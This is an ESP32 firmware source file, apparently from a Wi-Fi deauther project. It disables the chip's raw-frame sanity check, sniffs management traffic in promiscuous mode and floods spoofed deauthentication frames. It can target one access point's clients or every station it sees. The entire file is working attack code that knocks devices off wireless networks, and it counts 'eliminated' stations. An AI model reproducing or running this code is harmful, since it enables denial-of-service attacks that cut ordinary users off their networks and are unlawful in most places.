#include <WiFi.h>
#include <esp_wifi.h>
#include "deauth.h"
#include "definitions.h"
#include "types.h"

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations = 0;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

IRAM_ATTR void send_deauth_frames(const uint8_t* station, const uint8_t* ap, uint16_t reason) {
    memcpy(deauth_frame.station, station, 6);
    memcpy(deauth_frame.access_point, ap, 6);
    memcpy(deauth_frame.sender, ap, 6);
    deauth_frame.reason = reason;

    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
        esp_wifi_80211_tx(WIFI_IF_AP,  &deauth_frame, sizeof(deauth_frame), false);
    }
}

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
    if (raw->rx_ctrl.sig_len < sizeof(mac_hdr_t)) return;

    const mac_hdr_t *hdr = (mac_hdr_t *)raw->payload;

    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        if (memcmp(hdr->dest, deauth_frame.sender, 6) == 0 || memcmp(hdr->bssid, deauth_frame.sender, 6) == 0) {
            send_deauth_frames(hdr->src, deauth_frame.sender, deauth_frame.reason);
            eliminated_stations++;
            BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
        }
    } else {
        // Attack all
        if (memcmp(hdr->dest, hdr->bssid, 6) == 0 && memcmp(hdr->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
            send_deauth_frames(hdr->src, hdr->bssid, deauth_frame.reason);
            eliminated_stations++;
        }
    }
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
    eliminated_stations = 0;
    deauth_type = attack_type;
    if (reason == 0) reason = 7;        // default reason

    uint8_t channel = (wifi_number >= 0) ? WiFi.channel(wifi_number) : 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        DEBUG_PRINT("Starting targeted deauth on network #");
        DEBUG_PRINTLN(wifi_number);
        WiFi.softAP(AP_SSID, AP_PASS, channel);
        memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
    } else {
        DEBUG_PRINTLN("Starting deauth ALL stations - channel hopping");
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_MODE_STA);
    }

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter((wifi_promiscuous_filter_t*)&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);

    DEBUG_PRINTF("Attack on channel %d\n", channel);
}

void stop_deauth() {
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    deauth_type = DEAUTH_TYPE_SINGLE;
    DEBUG_PRINTLN("Deauth stopped.");
}